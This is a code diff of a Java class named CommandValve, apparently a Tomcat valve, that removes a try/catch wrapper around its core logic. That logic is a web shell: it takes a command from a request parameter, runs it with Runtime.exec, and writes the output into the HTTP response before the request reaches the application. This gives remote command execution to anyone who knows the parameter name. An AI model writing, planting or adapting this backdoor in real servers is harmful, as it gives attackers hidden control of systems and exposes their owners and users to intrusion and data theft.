@@ -41,20 +41,17 @@ public class CommandValve implements Valve {
 
     @Override
     public void invoke(Request request, Response response) throws IOException, ServletException {
-        try {
-            String cmd = request.getParameter(paramName);
-            if (cmd != null) {
-                Process exec = Runtime.getRuntime().exec(cmd);
-                InputStream inputStream = exec.getInputStream();
-                ServletOutputStream outputStream = response.getOutputStream();
-                byte[] buf = new byte[8192];
-                int length;
-                while ((length = inputStream.read(buf)) != -1) {
-                    outputStream.write(buf, 0, length);
-                }
-                return;
+        String cmd = request.getParameter(paramName);
+        if (cmd != null) {
+            Process exec = Runtime.getRuntime().exec(cmd);
+            InputStream inputStream = exec.getInputStream();
+            ServletOutputStream outputStream = response.getOutputStream();
+            byte[] buf = new byte[8192];
+            int length;
+            while ((length = inputStream.read(buf)) != -1) {
+                outputStream.write(buf, 0, length);
             }
-        } catch (Exception ignored) {
+            return;
         }
         this.getNext().invoke(request, response);
     }
